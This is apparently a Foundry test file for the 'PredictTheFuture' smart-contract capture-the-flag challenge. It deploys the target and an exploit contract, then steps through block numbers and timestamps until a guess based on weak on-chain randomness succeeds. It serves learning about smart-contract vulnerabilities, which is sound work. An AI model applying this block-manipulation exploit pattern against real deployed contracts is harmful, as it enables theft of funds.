// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = (new ExploitContract){value: 1 ether}(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        exploitContract.lockInGuess();
        uint8 i = 0;
        uint blockNumberSeed = 104293;
        uint timestampSeed = 93582192;
        while (!predictTheFuture.isComplete() && i < 100) {
            i++;
            blockNumberSeed++;
            timestampSeed++;
            vm.roll(blockNumberSeed);
            vm.warp(timestampSeed);
            console.log(block.number);
            console.log(block.timestamp);
            uint8 answer = exploitContract.settle();
            console.log(answer);
        }

        // Put your solution here

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
